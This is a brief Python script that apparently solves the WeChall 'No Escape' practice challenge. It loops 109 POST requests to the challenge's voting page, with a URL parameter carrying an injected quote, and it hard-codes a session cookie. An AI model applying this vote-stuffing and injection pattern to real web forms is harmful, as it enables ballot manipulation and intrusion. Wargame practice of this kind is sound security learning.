import requests,json
url = 'http://www.wechall.net/challenge/no_escape/index.php?vote_for=barack\''
payload = {
	'vote_for':'barack'
}
headers = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Encoding':'gzip,deflate,sdch',
	'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ko;q=0.2',
	'Connection':'keep-alive',
	'Cookie':'WC=7854887-12854-GVPzI30rSaeH1UQs',
	'Host':'www.wechall.net',
	'Referer':'http://www.wechall.net/challenge/no_escape/index.php?vote_for=barack',
	'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36'
}
for i in range(0,109):
	r = requests.post(url, data=json.dumps(payload), headers=headers)
	print i
